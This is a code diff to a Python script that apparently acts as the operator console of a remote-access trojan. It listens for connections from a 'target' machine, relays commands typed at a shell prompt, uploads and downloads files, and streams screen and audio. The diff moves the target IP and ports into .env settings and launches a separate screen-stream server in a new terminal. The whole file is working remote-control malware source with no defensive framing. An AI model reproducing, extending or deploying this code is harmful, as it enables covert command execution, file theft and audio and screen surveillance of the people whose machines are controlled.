@@ -8,18 +8,27 @@ import mss
 import numpy as np
 import struct
 import pyaudio
-import time
+import subprocess
+import sys
 
-target_ip = '127.0.0.1'  # Replace with server IP address
-target_port = 5005
-video_port = 9999
-audio_port = 6666
+from dotenv import load_dotenv
 
-# Constants
-CHUNK = 1024
-FORMAT = pyaudio.paInt16
-CHANNELS = 1
-RATE = 44100
+# Load environment variables from .env file
+dotenv_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../.env'))
+print(dotenv_path)
+load_dotenv(dotenv_path)
+
+# Set variables based on .env values
+TARGET_IP = os.getenv("TARGET_IP", "127.0.0.1")
+TARGET_PORT = int(os.getenv("TARGET_PORT", 5000))
+VIDEO_PORT = int(os.getenv("VIDEO_PORT", 9000))
+AUDIO_PORT = int(os.getenv("AUDIO_PORT", 6000))
+
+# Use these variables in your code
+print(f"Target IP: {TARGET_IP}")
+print(f"Target Port: {TARGET_PORT}")
+print(f"Video Port: {VIDEO_PORT}")
+print(f"Audio Port: {AUDIO_PORT}")
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(socket, data):
@@ -74,14 +83,11 @@ def download_file(socket, file_name):
         # Reset the timeout to its default value (None).
         socket.settimeout(None)
 
-
-
-
 # Function for the main communication loop with the target
 def target_communication(target):
     dir = ''
     while True:
-        command = input(f'* Shell~{str(target_ip)}: {dir}$ ')
+        command = input(f'* Shell~{str(TARGET_IP)}: {dir}$ ')
         reliable_send(target, command)
 
         # Common command
@@ -102,67 +108,56 @@ def target_communication(target):
             upload_file(target, command[7:])
 
         # Screen Streaming
-        elif command == 'endscreen':
-            screen_socket.close()
-        elif command == 'endaudio':
-            audio_socket.close()
-        elif command == 'endscreenstream':
-            screen_socket.close()
-            audio_socket.close()
-        # Command handling part
         elif command == 'screen':
-            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            screen_socket.bind((target_ip, video_port))
-            screen_socket.listen(1)  # Listen for one connection
-            print("Screen server listening at:", (target_ip, video_port))
-
-            client_socket, addr = screen_socket.accept()  # Accept the incoming connection
-            print("Connection from:", addr)
-
-            screen_thread = threading.Thread(target=screen_stream, args=(client_socket,))
-            screen_thread.start()
-            screen_thread.join()  # Wait for screen streaming to finish
-
-        elif command == 'audio':
-            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            audio_socket.bind((target_ip, audio_port))
-            audio_socket.listen(5)
-            print("Audio server listening at:", (target_ip, audio_port))
-
-            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
-            audio_thread.start()
-            audio_thread.join()  # Wait for audio streaming to finish
-        elif command == 'screen+audio':
-            screen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            screen_socket.bind((target_ip, video_port))
-            screen_socket.listen(5)
-            print("Screen server listening at:", (target_ip, video_port))
+            handle_screen_command()
             
-            audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            audio_socket.bind((target_ip, audio_port))
-            audio_socket.listen(5)
-            print("Audio server listening at:", (target_ip, audio_port))
-            
-            screen_thread = threading.Thread(target=screen_stream, args=(screen_socket,))
-            audio_thread = threading.Thread(target=audio_stream, args=(audio_socket,))
-            screen_thread.start()
-            audio_thread.start()
-            screen_thread.join()  # Wait for screen streaming to finish
-            audio_thread.join()   # Wait for audio streaming to finish
-        
         # Others
         else:
-            result = reliable_recv(socket)
+            result = reliable_recv(target)
             print(result)
 
-# Function to stream screen content
-def screen_stream(client_socket):
+# Function to get the virtual environment path
+def get_virtualenv_path():
+    # Check if we are in a virtual environment
+    if hasattr(sys, 'real_prefix') or (hasattr(sys, 'base_prefix') and sys.base_prefix != sys.prefix):
+        # Python is running in a virtual environment
+        if sys.platform == 'win32':
+            return os.path.join(sys.prefix, 'Scripts', 'activate.bat')
+        else:
+            return os.path.join(sys.prefix, 'bin', 'activate')
+
+    # If not in a virtual environment, return None
+    return None
+
+# Function to handle screen command
+def handle_screen_command():
+    current_dir = os.path.abspath('.')
+    script_path = os.path.join(current_dir, 'screenstream_server.py')
+
+    virtualenv_activate = get_virtualenv_path()
+    if virtualenv_activate:
+        if os.name == 'posix':
+            if 'darwin' in os.uname().sysname.lower():  # macOS
+                # Create a new iTerm window and execute the command
+                osascript_command = f'tell application "iTerm"\n' \
+                                    f'  create window with default profile\n' \
+                                    f'  tell current session of current window to write text "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"\n' \
+                                    f'end tell'
+                subprocess.Popen(["osascript", "-e", osascript_command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                # osascript_command = f'tell app "Terminal" to do script "cd {os.path.dirname(script_path)} && source {virtualenv_activate} && python3 {os.path.basename(script_path)}"'
+                # subprocess.Popen(["osascript", "-e", osascript_command])
+            else:  # Linux
+                terminal_command = f'gnome-terminal -- bash -c "cd {current_dir} && source {virtualenv_activate} && python3 {script_path}; exec bash"'
+                subprocess.Popen(terminal_command, shell=True)
+        # Add elif block for other OS types if needed
+    else:
+        print("Virtual environment not found.")
+    
+def screen_stream(screen_socket):
     w, h = pyautogui.size()
     monitor = {"top": 0, "left": 0, "width": w, "height": h}
-    
+
     try:
-        t0 = time.time()
-        n_frames = 1
         with mss.mss() as sct:
             while True:
                 screen = sct.grab(monitor)
@@ -170,45 +165,38 @@ def screen_stream(client_socket):
                 _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 80])
                 message = struct.pack(">L", len(buffer)) + buffer.tobytes()
                 try:
-                    client_socket.sendall(message)
+                    screen_socket.sendall(message)
                 except BrokenPipeError:
                     print("Broken pipe error, connection lost.")
                     break
-
-                elapsed_time = time.time() - t0
-                avg_fps = (n_frames / elapsed_time)
-                print("Screen Average FPS: " + str(avg_fps))
-                n_frames += 1
     except KeyboardInterrupt:
         print("Stopped by user.")
     finally:
-        client_socket.close()
+        screen_socket.close()
 
-# Function to stream audio content
-def audio_stream(client_socket):
+def audio_stream(audio_socket):
     p = pyaudio.PyAudio()
-    stream = p.open(format=FORMAT,
-                    channels=CHANNELS,
-                    rate=RATE,
+    stream = p.open(format=pyaudio.paInt16,
+                    channels=1,
+                    rate=44100,
                     input=True,
-                    frames_per_buffer=CHUNK)
-    
+                    frames_per_buffer=1024)
     try:
         while True:
-            data = stream.read(CHUNK, exception_on_overflow=False)
-            client_socket.sendall(data)
+            data = stream.read(1024, exception_on_overflow=False)
+            audio_socket.sendall(data)
     except KeyboardInterrupt:
         print("Stopped by user.")
     finally:
         stream.stop_stream()
         stream.close()
         p.terminate()
-        client_socket.close()
+        audio_socket.close()
 
 def main():
     # Create a socket for the server
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.bind((target_ip, target_port))
+    sock.bind((TARGET_IP, TARGET_PORT))
     sock.listen(5)
     print('[+] Listening For The Incoming Connections')
 
